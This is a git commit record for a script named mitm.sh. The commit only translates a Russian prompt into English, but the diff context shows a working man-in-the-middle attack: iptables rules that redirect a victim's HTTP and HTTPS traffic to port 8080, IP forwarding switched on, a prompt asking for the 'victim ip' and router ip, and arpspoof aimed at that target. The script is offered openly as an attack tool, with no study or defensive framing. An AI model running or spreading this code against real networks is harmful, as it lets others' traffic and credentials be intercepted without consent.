c97b8d4649a3db25bca2f8560ac10d4b59c9b2c5
alexmihalyk23 <alexmihalyk23@gmail.com>
2019-04-28 22:59:17 +0700

    release v1

--- mitm.sh
+++ mitm.sh
@@ -3,7 +3,7 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
 echo "1" > /proc/sys/net/ipv4/ip_forward
 while [ "$net" = "" ]; do
-    echo -n "Введите ip жертвы и ip роутера через пробел "
+    echo -n "Enter victim ip and  router ip with space "
     read net
     if [ -n "$net" ]; then
         arpspoof -i wlp3s0 -t $net &
